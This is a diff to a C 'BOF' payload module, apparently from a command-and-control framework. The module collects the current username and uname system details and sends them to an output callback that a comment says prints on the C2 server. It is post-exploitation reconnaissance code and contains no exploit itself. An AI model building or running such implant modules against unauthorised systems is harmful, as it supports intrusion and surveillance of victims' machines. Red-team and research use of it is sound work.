@@ -5,10 +5,9 @@
 
 #include "../OutputFormatter.h" // Required!
 
-int payload_init(char* data) {
+typedef void(*output_func)(const char* fmt, ...); // For printing output on C2 server.
 
-    printf("[BOF] OUTPUT_DATA:  %p\n", data);
-    printf("[BOF] data:         %s\n", data);
+int payload_init(output_func output) {
 
     // Get username.
     char* username = getlogin();
@@ -16,6 +15,7 @@ int payload_init(char* data) {
     // Get computer information.
     struct utsname buffer;
     if (uname(&buffer) < 0) {
+        output("Failed to get uname information! Error code: %d\n", errno);
         return 1;
     }
 
@@ -24,12 +24,7 @@ int payload_init(char* data) {
     char info[infoSize];
 
     snprintf(info, infoSize, "%s %s %s", buffer.release, buffer.machine, buffer.version); // From OutputFormatter.h
-    printf("[BOF]: %s\n", info);
 
-
-    // Realloc buffer...
-    // char* tempStr = (char*)realloc(data, infoSize) +1;
-
-    snprintf(data, infoSize, "%s %s %s", buffer.release, buffer.machine, buffer.version); // Add output to dataOutput.
+    output("%s %s %s", buffer.release, buffer.machine, buffer.version);
     return 0;
 }
